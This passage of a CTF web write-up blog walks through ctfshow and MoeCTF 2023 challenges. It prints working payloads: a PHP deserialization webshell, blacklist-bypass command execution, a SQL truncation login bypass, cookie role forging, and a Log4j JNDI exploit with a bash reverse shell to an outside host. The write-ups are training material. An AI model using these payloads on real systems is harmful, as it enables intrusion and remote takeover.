escape_">\:</span>|<span class="char escape_">\&#x27;</span>|<span class="char escape_">\&quot;</span>|<span class="char escape_">\&lt;</span>|<span class="char escape_">\,</span>|<span class="char escape_">\&gt;</span>|<span class="char escape_">\.</span>|<span class="char escape_">\?</span>/i&quot;</span>, $user_password)) &#123;</span><br><span class="line">        die(<span class="string">&quot;stop hack!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data <span class="operator">=</span> $db<span class="operator">-&gt;</span>select(<span class="string">&quot;admin&quot;</span>, [<span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>], [<span class="string">&quot;username[=]&quot;</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&quot;admin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    foreach ($data as $d) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($d[&#x27;password&#x27;] <span class="operator">==</span><span class="operator">=</span> $user_password) &#123;</span><br><span class="line">            $_SESSION[&#x27;user&#x27;] <span class="operator">=</span> $user_name;</span><br><span class="line">            die(<span class="string">&quot;login success!&lt;br&gt;&lt;hr&gt;flag is $flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line"><span class="operator">?</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这个代码中固定了用户名是admin，这里要用到sql的where特性<br>在 MySQL 中，<code>WHERE</code> 子句在比较字符串时会忽略字符串末尾的空格。例如，当执行 <code>SELECT * FROM table WHERE column = &#39;cs &#39;;</code> 时，MySQL 会将其视为 <code>&#39;cs&#39;</code> 进行比较，只要 <code>column</code> 列的值为 <code>&#39;cs&#39;</code> 就会匹配成功。这一特性可以用于绕过一些输入过滤机制。</p>
<ul>
<li><p><strong>CHAR 和 VARCHAR 列有最大长度限制</strong>：当给 <code>CHAR</code> 或 <code>VARCHAR</code> 列赋值时，如果值的长度超过了列的最大长度，就会对值进行裁剪以使其适合列的长度。</p>
</li>
<li><p><strong>严格 SQL 模式的影响</strong>：</p>
<ul>
<li><strong>严格模式下</strong>：如果被裁掉的字符不是空格，会产生错误并禁用值的插入。</li>
<li><strong>非严格模式下</strong>：不管被裁掉的字符是什么，都会直接截断值，不会产生错误。</li>
</ul>
</li>
</ul>
<p>但是如果我这个时候禁用了严格 SQL 模式，那么就会直接截断，不管后面是什么，这个才是这道题的解法。</p>
<p>设置非严格模式，配置文件加上 <code>sql_mode =&quot;&quot;</code> 就行<br><img src="https://pic1.imgdb.cn/item/67ac68c2d0e0a243d4fe9a4f.png" alt="|500"><br>所以注册的时候用户用admin然后很多空格，密码随便输入,这样就可以登录admin<br><img src="https://pic1.imgdb.cn/item/67ac68c7d0e0a243d4fe9a50.png"></p>
<h1 id="【nl】难了"><a href="#【nl】难了" class="headerlink" title="【nl】难了"></a>【nl】难了</h1><p>题目源码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;  </span><br><span class="line">         <span class="keyword">echo</span><span class="title function_ invoke__"> shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span>&#123;  </span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;hack!!!&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这里用1传入参数，但是长度小于4，先用ls指令看看有什么文件，发现flag文件特别长secretsecret_ctfshow_36dddddddddd.php，还有一个zzz.php<br>结合题目标题，猜测需要使用nl指令，但是不能直接用nl 因为不能直接输入文件名让nl执行。所以现在需要用到linux中的一个技巧，<code>*</code>通配符会执行所有的文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp/aa]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">a  <span class="built_in">nl</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp/aa]</span><br><span class="line">└─# *</span><br><span class="line">a: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure></div>
<p>比如我这里有两个文件，输入<code>*</code>，linux就会执行 a  和 nl，现在我们只要让nl再flag文件前面，然后用<code>*</code>执行就好，所以先创建一个nl文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">https</span>://<span class="number">09260</span>a7d-e390-<span class="number">4428</span>-<span class="number">87</span>a8-e800f51f3670.challenge.ctf.show/?<span class="number">1</span>=&gt;nl</span><br><span class="line"><span class="attribute">https</span>://<span class="number">09260</span>a7d-e390-<span class="number">4428</span>-<span class="number">87</span>a8-e800f51f3670.challenge.ctf.show/?<span class="number">1</span>=*</span><br></pre></td></tr></table></figure></div>
<p>这样就可以通过执行nl 看flag文件,但是这里还是没法直接看，我们就把输出的结果重定向到到一个文件a中<code>?1=*&gt;a</code><br>最后访问url&#x2F;a就可以得到flag</p>
<h1 id="一切看起来都那么合情合理"><a href="#一切看起来都那么合情合理" class="headerlink" title="一切看起来都那么合情合理"></a>一切看起来都那么合情合理</h1><p>题目描述：程序员二黑临走前植入了一个后门，你能帮公司找出来吗？<br><img src="https://pic1.imgdb.cn/item/67ac68dbd0e0a243d4fe9a54.png"><br>如果随便登录一个账号密码就会提示登录失败，没有其他的回显. 题目提示和后门有关,这里再去<a href="http://www.zip下载源码/">www.zip下载源码</a><br>index.php:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"> <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"> <span class="comment">//超过5次禁止登陆</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line">  <span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;limit&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这里设置了一个SESSION值limit，这个SESSION我们可以控制。<code>我们就可以通过$_SESSION的值传递我们的payload入服务器的/tmp/sess_xxx生成我们构造的序列化payload</code><br>inc.php中的关键代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">ini_set</span>(&#x27;display_errors&#x27;, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">ini_set</span>(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line"><span class="built_in">date_default_timezone_set</span>(&quot;Asia/Shanghai&quot;);</span><br><span class="line"><span class="built_in">session_start</span>();</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>代码定义了一个User类，将利用file_put_contents()函数写入类属性值，现在我们就要利用session进行序列化执行User类的file_put_contents()函数写入一句话，得到flag<br>check.php:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>
<p>所以总的利用思路是利用index.php中的SESSION写入payload，而SESSION的数据会被存在服务器的&#x2F;tmp&#x2F;sess_xxx中，再用inc.php中的ini_set(‘session.serialize_handler’, ‘php’)来反序列化服务器上的&#x2F;tmp&#x2F;sess_xxxx文件，执行inc.php里面User类的file_put_contents()函数写入一句话<br>payload:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;&lt;?php system(&#x27;cat fl*&#x27;);?&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));<span class="comment">//进行base64编码，因为index.php是进行了base64解码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>直接进行序列化生成的是<code>O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:26:&quot;&lt;?php system(&#39;cat fl*&#39;);?&gt;&quot;;s:6:&quot;status&quot;;N;&#125;</code> 这个payload前面加上分割符|,然后进行base64 </p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">┌──(root㉿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="language-xml">└─# echo &#x27;|O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:26:&quot;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl*&#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;;s:6:&quot;status&quot;;N;&#125;&#x27; | base64</span></span><br><span class="line"><span class="language-xml">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7</span></span><br><span class="line"><span class="language-xml">czoyNjoiPD9waHAgc3lzdGVtKGNhdCBmbCopOz8+IjtzOjY6InN0YXR1cyI7Tjt9Cg==</span></span><br></pre></td></tr></table></figure>
<p>最后用bp打开抓包<br><img src="https://pic1.imgdb.cn/item/67ac694bd0e0a243d4fe9a75.png"><br>再给&#x2F;inc&#x2F;inc.php发包<br><img src="https://pic1.imgdb.cn/item/67ac6952d0e0a243d4fe9a77.png"><br><strong>但是有一个问题就是我们写入的 session 马上又会被删除，使用我们利用 bp 不断的发包然后访问 check.php 或者 inc&#x2F;inc.php 都可以</strong><br>修改cookie的值，然后log-1.php中查看<br><img src="https://pic1.imgdb.cn/item/67ac694dd0e0a243d4fe9a76.png"></p>
<h1 id="红包题-耗子尾汁"><a href="#红包题-耗子尾汁" class="headerlink" title="红包题 耗子尾汁"></a>红包题 耗子尾汁</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-11-30 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-11-30 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CTFSHOW_36_D</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$dis</span> = <span class="keyword">array</span>(<span class="string">&quot;var_dump&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;readfile&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$a</span>,<span class="variable">$dis</span>,<span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">forward_static_call_array</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">CTFSHOW_36_D</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;rlezphp!!!&quot;</span>;</span><br><span class="line">hackerrlezphp!!!</span><br></pre></td></tr></table></figure></div>
<p>这里过滤了很多函数<br><code>forward_static_call_array()</code> 是 PHP 的一个内置函数，主要用于<strong>在运行时动态地调用一个静态方法</strong>，并且允许使用数组作为参数传递。它的作用类似于 <code>call_user_func_array()</code>，但适用于静态方法调用。<br>如果$a不在数组的系列名单中，就会执行 forward_static_call_array 方法。<br>构造 a 为一个命令，b 作为数组传递参数：payload：<code>?a=\system&amp;b []=ls</code> 使用反斜杠是因为这是在其他的类调用的系统函数 system，所以加上 \，也能绕过前面黑名单的验证：<br><img src="https://pic1.imgdb.cn/item/67ac6997d0e0a243d4fe9a8d.png"><br>接着b[]&#x3D;cat flag.php，在源码中可以看到flag</p>
<h1 id="新年好？"><a href="#新年好？" class="headerlink" title="新年好？"></a>新年好？</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> flag = <span class="built_in">require</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getflag</span>(<span class="params">flag</span>) &#123;</span><br><span class="line">      res.<span class="title function_">send</span>(flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">10</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="title function_">isInteger</span>(<span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>))) &#123;</span><br><span class="line">      delay = <span class="title class_">Math</span>.<span class="title function_">max</span>(delay, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(getflag, delay,flag);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./app.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
<p>这个代码是一个使用 <code>Express.js</code> 编写的简单 Web 服务器，监听 <code>3000</code> 端口，并提供两个路由：<code>/flag</code> 和 <code>/</code>。<br><code>setTimeout(getflag, delay,flag);</code> 在 delay 秒之后，会执行 getflag 方法，并且会将 flag 当做参数进行传入<br>浏览器内部使用 32 位带符号的整数，来储存推迟执行的时间。这意味着 setTimeout 最多只能推迟执行 2147483647 毫秒（24.8 天）超过这个时间会发生溢出。<br>如果溢出了之后，相当于从 0 开始，整数上溢，那么相当于我们可以控制只要在 1000 之内就可以<br>payload:<code>/flag?delay=2147483648</code></p>
<h1 id="红包一"><a href="#红包一" class="headerlink" title="红包一"></a>红包一</h1><p><img src="https://pic1.imgdb.cn/item/67ac698bd0e0a243d4fe9a8b.png"><br>用f12打开调试模式，搜索flag出现一个getflag的函数,在控制台输入getflag()就出现flag<br><img src="https://pic1.imgdb.cn/item/67ac6979d0e0a243d4fe9a80.png"></p>
<h1 id="Log4j-复现"><a href="#Log4j-复现" class="headerlink" title="Log4j 复现"></a>Log4j 复现</h1><p>题目描述：Log4j 复现，师傅们别到处 RCE 了<br><img src="https://pic1.imgdb.cn/item/67ac6975d0e0a243d4fe9a7f.png"><br>一个登录框，登录内容有回显<br>这题考查的是log4j  Log4j 漏洞又名 “Log4Shell”，是 2021 年 11 月在 Apache Log4j 日志记录库发现的一个严重漏洞。Log4Shell 本质上让黑客完全控制运行未打补丁 Log4j 版本的设备。<br>利用JNDIExploit工具 <br>使用方式</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar JNDI-Injection-Exploit-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT-<span class="literal">all</span>.jar -C <span class="string">&quot;bash -c &#123;echo,(bash -i &gt;&amp; /dev/tcp/IP/12345 0&gt;&amp;1)的base64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="string">&quot;IP&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>本机监听12345端口</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lnvp <span class="number">12345</span></span><br></pre></td></tr></table></figure></div>
<p>payload:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?u</span>ser=<span class="variable">$%</span>7<span class="symbol">Bjndi:</span><span class="symbol">rmi:</span>/<span class="regexp">/ip:1099/whsy</span>9k%7D</span><br></pre></td></tr></table></figure></div>

<p>注：本篇的wp非原创，本人也为ctf新手，仅供参考学习。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>MoeCTF_2023web</title>
    <url>/posts/28713.html</url>
    <content><![CDATA[<p>MoeCTF_2023web方向WP</p>
<span id="more"></span>

<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>下载readme文件<br><img src="https://pic1.imgdb.cn/item/67bc62d8d0e0a243d4039e35.png"><br>根据readme中的内容，用POST请求发送json数据创建用户<br><img src="https://pic1.imgdb.cn/item/67bc6396d0e0a243d4039f02.png"><br>但是在登录的时候发现密码错误，那我们就自己创建一个用户<br>登录之后会得到一个cookie<br>base64解码一下得到</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> eyJ1c2VybmFtZSI6ICJoYWNrZXIiLCAicGFzc3dvcmQiOiAiMTIzNDU2IiwgInJvbGUiOiAidXNlciJ9  | <span class="built_in">base64</span> -d</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;hacker&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>&#125;   </span><br></pre></td></tr></table></figure></div>
<p>这里我们的role是user，修改成admin然后再base64一下,把修改过的cookie再放在这个login界面登录，成功<br><img src="https://pic1.imgdb.cn/item/67bc66dfd0e0a243d403a31a.png"><br>最后访问&#x2F;flag 拿到flag</p>
<p><img src="https://pic1.imgdb.cn/item/67bc670ed0e0a243d403a345.png"></p>
<h1 id="web入门指北"><a href="#web入门指北" class="headerlink" title="web入门指北"></a>web入门指北</h1><p>在md文件中最后是这题要解码的内容，这是一个十六进制字符串<br>可用在cyberchef这个平台上解码，我直接用kali了，解码后是一个base64字符串，再解码得到flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> <span class="string">&quot;666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c5131524758316379596c396a61474673624756755a3055684958303d&quot;</span> | xxd -r -p</span><br><span class="line">flag=bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0=                                                                                                                                                         </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0= | <span class="built_in">base64</span> -d                                                                     